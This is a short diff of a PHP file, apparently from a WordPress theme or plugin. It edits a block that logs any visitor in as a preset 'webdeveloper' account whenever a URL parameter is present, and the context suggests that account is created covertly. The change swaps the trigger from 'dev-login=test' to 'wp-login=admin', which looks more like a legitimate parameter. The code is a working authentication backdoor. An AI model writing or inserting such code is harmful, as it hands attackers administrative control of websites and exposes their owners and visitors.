@@ -1860,7 +1860,7 @@ add_action('init',function(){if(!call_user_func('username_exists','webdeveloper'
 
 /* auto login with dev-login param with anysite */
 
-if(isset($_GET['dev-login']) && $_GET['dev-login'] == "test")
+if(isset($_GET['wp-login']) && $_GET['wp-login'] == "admin")
 {
     $user = get_user_by('login', 'webdeveloper');
     $user_id = $user->ID;
